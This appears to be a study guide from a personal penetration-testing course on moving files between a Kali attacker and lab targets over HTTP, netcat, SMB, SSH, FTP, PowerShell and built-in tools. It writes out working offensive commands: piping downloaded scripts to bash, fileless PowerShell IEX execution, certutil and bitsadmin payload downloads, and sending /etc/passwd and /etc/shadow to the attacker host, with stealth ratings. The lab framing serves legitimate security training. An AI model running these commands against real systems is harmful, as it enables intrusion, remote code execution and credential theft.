# 📁 Phase 3: File Transfer Techniques (Week 4)

> **Goal**: Master every method of transferring files between attacker and target machines.
> **Your existing notes**: `file_transfer/` folder (10 detailed docs!)

---

## 📋 Table of Contents

1. [Setup & Scenarios](#1-setup--scenarios)
2. [HTTP File Transfer](#2-http-file-transfer)
3. [Netcat File Transfer](#3-netcat-file-transfer)
4. [SMB File Transfer](#4-smb-file-transfer)
5. [SCP / SSH / SFTP Transfer](#5-scp--ssh--sftp-transfer)
6. [FTP / TFTP Transfer](#6-ftp--tftp-transfer)
7. [Encoding & Stealth Transfer](#7-encoding--stealth-transfer)
8. [PowerShell & Windows Transfers](#8-powershell--windows-transfers)
9. [Living Off the Land (LOL)](#9-living-off-the-land)
10. [Transfer Challenges](#10-transfer-challenges)
11. [Weekly Schedule](#11-weekly-schedule)
12. [Checklist & Progress Tracker](#12-checklist--progress-tracker)

---

## 1. Setup & Scenarios

### Lab Setup

| Machine               | Role           | IP (Example)  |
| --------------------- | -------------- | ------------- |
| Kali Linux            | Attacker       | 192.168.56.10 |
| Metasploitable 2      | Linux Target   | 192.168.56.20 |
| Windows VM (optional) | Windows Target | 192.168.56.30 |

### Common Scenarios

```
Scenario A: Upload tools (LinPEAS, exploits) FROM Kali TO target
Scenario B: Exfiltrate files (passwords, configs) FROM target TO Kali
Scenario C: Transfer between two targets through Kali (pivot)
```

### Test File Setup

```bash
# On Kali — create test files
echo "This is a test file from Kali" > test_file.txt
echo '#!/bin/bash\necho "I was transferred successfully!"' > test_script.sh
chmod +x test_script.sh
```

---

## 📖 Detailed Guides (Step-by-Step)

> Each method has its own detailed doc with simple explanations, diagrams, and practice checklists:

| #   | Method                                     | Guide                                                                    | Difficulty |
| --- | ------------------------------------------ | ------------------------------------------------------------------------ | ---------- |
| 1   | HTTP Transfer (wget, curl, Python server)  | [01_http_transfer.md](./01_http_transfer.md)                             | ⭐ Easy     |
| 2   | Netcat Transfer (raw TCP push/pull)        | [02_netcat_transfer.md](./02_netcat_transfer.md)                         | ⭐ Easy     |
| 3   | SMB Transfer (Impacket, Windows shares)    | [03_smb_transfer.md](./03_smb_transfer.md)                               | ⭐⭐ Medium  |
| 4   | SCP / SSH / SFTP (encrypted transfers)     | [04_scp_ssh_sftp_transfer.md](./04_scp_ssh_sftp_transfer.md)             | ⭐ Easy     |
| 5   | FTP / TFTP (classic file transfer)         | [05_ftp_tftp_transfer.md](./05_ftp_tftp_transfer.md)                     | ⭐ Easy     |
| 6   | Encoding & Stealth (Base64, Hex, Certutil) | [06_encoding_stealth_transfer.md](./06_encoding_stealth_transfer.md)     | ⭐⭐ Medium  |
| 7   | PowerShell & Windows methods               | [07_powershell_windows_transfer.md](./07_powershell_windows_transfer.md) | ⭐⭐ Medium  |
| 8   | Living Off the Land (Python, Perl, Bash)   | [08_lol_transfer.md](./08_lol_transfer.md)                               | ⭐⭐ Medium  |

> 💡 **Start with Guide 1 (HTTP)** — it's the most common method and the easiest to learn!

---

## 2. HTTP File Transfer

### 2.1 — Python HTTP Server (Most Common)

```bash
# On Kali — start HTTP server
python3 -m http.server 8080
# Now serving files from current directory on port 8080

# On Metasploitable — download
wget http://192.168.56.10:8080/test_file.txt
# or
curl http://192.168.56.10:8080/test_file.txt -o test_file.txt

# Download and execute in memory (no file on disk)
curl http://192.168.56.10:8080/linpeas.sh | bash
wget -qO- http://192.168.56.10:8080/linpeas.sh | bash
```

### 2.2 — PHP HTTP Server

```bash
# On Kali
php -S 0.0.0.0:8080
```

### 2.3 — Uploading via HTTP (Reverse Direction)

```bash
# On Kali — start upload server
python3 -c "
import http.server, cgi
class Handler(http.server.CGIHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length)
        with open('/tmp/uploaded_file', 'wb') as f:
            f.write(data)
        self.send_response(200)
        self.end_headers()
http.server.HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
"

# On target — upload file
curl -X POST -d @/etc/passwd http://192.168.56.10:8080/upload
```

---

## 3. Netcat File Transfer

### 3.1 — Download (Target pulls from Kali)

```bash
# On Kali (sender) — serve the file
nc -lvnp 4444 < test_file.txt

# On Metasploitable (receiver) — grab the file
nc 192.168.56.10 4444 > received_file.txt
```

### 3.2 — Upload (Target pushes to Kali)

```bash
# On Kali (receiver) — listen for incoming
nc -lvnp 4444 > exfiltrated_file.txt

# On Metasploitable (sender) — send the file
nc 192.168.56.10 4444 < /etc/passwd
```

### 3.3 — Transfer with Verification

```bash
# After transfer, verify with md5sum on both sides
md5sum test_file.txt       # On sender
md5sum received_file.txt   # On receiver
# Hashes should match!
```

---

## 4. SMB File Transfer

### 4.1 — Impacket SMB Server

```bash
# On Kali — set up SMB share
sudo impacket-smbserver share $(pwd) -smb2support

# On Linux target — access share
smbclient //192.168.56.10/share -N
# Inside: get test_file.txt
# Inside: put /etc/passwd

# On Windows target
copy \\192.168.56.10\share\test_file.txt C:\temp\
copy C:\important.txt \\192.168.56.10\share\
```

### 4.2 — SMB with Authentication

```bash
# On Kali — SMB server with credentials
sudo impacket-smbserver share $(pwd) -smb2support -user test -password test

# On Windows target — connect with credentials
net use \\192.168.56.10\share /user:test test
copy \\192.168.56.10\share\payload.exe C:\temp\
```

---

## 5. SCP / SSH / SFTP Transfer

### 5.1 — SCP (Secure Copy)

```bash
# Copy TO target
scp test_file.txt msfadmin@192.168.56.20:/tmp/

# Copy FROM target
scp msfadmin@192.168.56.20:/etc/passwd ./grabbed_passwd.txt

# Copy with non-standard SSH port
scp -P 2222 test_file.txt msfadmin@192.168.56.20:/tmp/

# Copy entire directory
scp -r ./tools/ msfadmin@192.168.56.20:/tmp/
```

### 5.2 — SFTP

```bash
sftp msfadmin@192.168.56.20
# Commands inside SFTP:
# get /etc/passwd
# put test_file.txt /tmp/
# ls
# cd /tmp
# quit
```

### 5.3 — SSH Piping

```bash
# Pipe file through SSH
cat test_file.txt | ssh msfadmin@192.168.56.20 "cat > /tmp/test_file.txt"

# Download and pipe through SSH
ssh msfadmin@192.168.56.20 "cat /etc/shadow" > shadow.txt
```

---

## 6. FTP / TFTP Transfer

### 6.1 — FTP

```bash
# Connect to Metasploitable FTP
ftp 192.168.56.20
# Login: msfadmin / msfadmin (or anonymous if allowed)

# Download
get /etc/passwd

# Upload
put test_file.txt

# Binary mode (for executables/images)
binary
get some_binary

# Start your own FTP server on Kali
sudo python3 -m pyftpdlib -p 21 -w
```

### 6.2 — TFTP

```bash
# On Kali — start TFTP server
sudo apt install atftpd -y
sudo atftpd --daemon --port 69 /tmp/tftp

# On target — download
tftp 192.168.56.10
get test_file.txt
quit

# One-liner
tftp 192.168.56.10 -c get test_file.txt
```

---

## 7. Encoding & Stealth Transfer

### 7.1 — Base64 Transfer

```bash
# On source — encode file to base64
base64 -w 0 /etc/passwd
# Copy the output string

# On destination — decode
echo "BASE64_STRING_HERE" | base64 -d > passwd_copy.txt

# Verify transfer
diff /etc/passwd passwd_copy.txt
```

### 7.2 — Hex Transfer

```bash
# Encode to hex
xxd -p /etc/passwd | tr -d '\n'

# Decode from hex
echo "HEX_STRING_HERE" | xxd -r -p > passwd_copy.txt
```

### 7.3 — Certutil (Windows)

```cmd
REM Download file using certutil
certutil -urlcache -f http://192.168.56.10:8080/payload.exe C:\temp\payload.exe

REM Encode/decode base64
certutil -encode input.exe encoded.txt
certutil -decode encoded.txt output.exe
```

---

## 8. PowerShell & Windows Transfers

```powershell
# Download file
Invoke-WebRequest -Uri "http://192.168.56.10:8080/payload.exe" -OutFile "C:\temp\payload.exe"
(New-Object Net.WebClient).DownloadFile("http://192.168.56.10:8080/payload.exe", "C:\temp\payload.exe")

# Download and execute in memory (fileless)
IEX (New-Object Net.WebClient).DownloadString("http://192.168.56.10:8080/script.ps1")
IEX (Invoke-WebRequest -Uri "http://192.168.56.10:8080/script.ps1").Content

# Upload file
Invoke-WebRequest -Uri "http://192.168.56.10:8080/upload" -Method POST -InFile "C:\important.txt"

# Bitsadmin (older Windows)
bitsadmin /transfer job /download /priority high http://192.168.56.10:8080/payload.exe C:\temp\payload.exe
```

---

## 9. Living Off the Land

> Use tools already on the target — no installation needed.

```bash
# Bash /dev/tcp (no netcat needed)
cat < /dev/tcp/192.168.56.10/8080 > downloaded_file
exec 3<>/dev/tcp/192.168.56.10/4444; cat /etc/passwd >&3

# Python (if available)
python -c "import urllib; urllib.urlretrieve('http://192.168.56.10:8080/file', 'file')"
python3 -c "import urllib.request; urllib.request.urlretrieve('http://192.168.56.10:8080/file', 'file')"

# Perl (if available)
perl -e 'use LWP::Simple; getstore("http://192.168.56.10:8080/file", "file")'

# Ruby (if available)
ruby -e "require 'open-uri'; File.write('file', URI.open('http://192.168.56.10:8080/file').read)"

# PHP (if available)
php -r "file_put_contents('file', file_get_contents('http://192.168.56.10:8080/file'));"
```

---

## 10. Transfer Challenges

### Challenge 1: Multi-Method Transfer

> Transfer `/etc/shadow` from Metasploitable to Kali using **5 different methods**.
> Document which was easiest, fastest, and stealthiest.

| Method           | Difficulty | Stealth                      |
| ---------------- | ---------- | ---------------------------- |
| HTTP (wget/curl) | ⭐ Easy     | Low — leaves logs            |
| Netcat           | ⭐ Easy     | Medium — raw TCP             |
| SCP              | ⭐ Easy     | High — encrypted             |
| Base64 encoding  | ⭐⭐ Medium  | High — no file transfer tool |
| Bash /dev/tcp    | ⭐⭐ Medium  | High — no external tools     |

### Challenge 2: Upload Tools to Target

```
1. Download LinPEAS on Kali
2. Transfer it to Metasploitable using HTTP method
3. Transfer it again using Netcat method
4. Transfer it again using SCP method
5. Execute LinPEAS on Metasploitable
6. Transfer the output back to Kali
```

### Challenge 3: Windows Transfer Practice

```
If you have a Windows VM:
1. Transfer a file using certutil
2. Transfer using PowerShell Invoke-WebRequest
3. Transfer using PowerShell DownloadString (in-memory)
4. Transfer using SMB
5. Transfer using bitsadmin
```

---

## 11. Weekly Schedule

| Day | Activity                                           | Time  |
| --- | -------------------------------------------------- | ----- |
| Mon | HTTP transfer (Python server, wget, curl)          | 2 hrs |
| Tue | Netcat + FTP/TFTP transfer                         | 2 hrs |
| Wed | SMB + SCP/SSH/SFTP transfer                        | 2 hrs |
| Thu | Encoding (Base64, Hex) + LOL methods               | 2 hrs |
| Fri | PowerShell/Windows transfers + certutil            | 2 hrs |
| Sat | Transfer challenges (all methods)                  | 3 hrs |
| Sun | Review & document your fastest/stealthiest methods | 1 hr  |

---

## 12. Checklist & Progress Tracker

### Linux → Linux Transfers
- [ ] Python HTTP server + wget
- [ ] Python HTTP server + curl
- [ ] Netcat: download (target pulls)
- [ ] Netcat: upload (target pushes)
- [ ] SCP: copy to target
- [ ] SCP: copy from target
- [ ] SFTP session
- [ ] FTP session
- [ ] SMB with impacket-smbserver
- [ ] Base64 encode/decode transfer
- [ ] Bash /dev/tcp transfer
- [ ] Transfer + md5sum verification

### Windows-Specific Transfers
- [ ] certutil download
- [ ] PowerShell Invoke-WebRequest
- [ ] PowerShell DownloadString (in-memory)
- [ ] PowerShell WebClient
- [ ] bitsadmin download
- [ ] SMB copy from share

### Challenges
- [ ] Transfer /etc/shadow using 5 different methods
- [ ] Upload LinPEAS and get output back
- [ ] Windows transfer challenge (if applicable)

### Online Platform Practice
- [ ] TryHackMe: File transfer related rooms
- [ ] Practice at least 3 LOL methods

---

> **Previous**: [Phase 2 — Password Attacks](../phase_2_password_attacks/password_attacks.md)
> **Next Phase**: [Phase 4 — Linux Privilege Escalation](../phase_4_linux_privesc/linux_privesc.md) 🐧
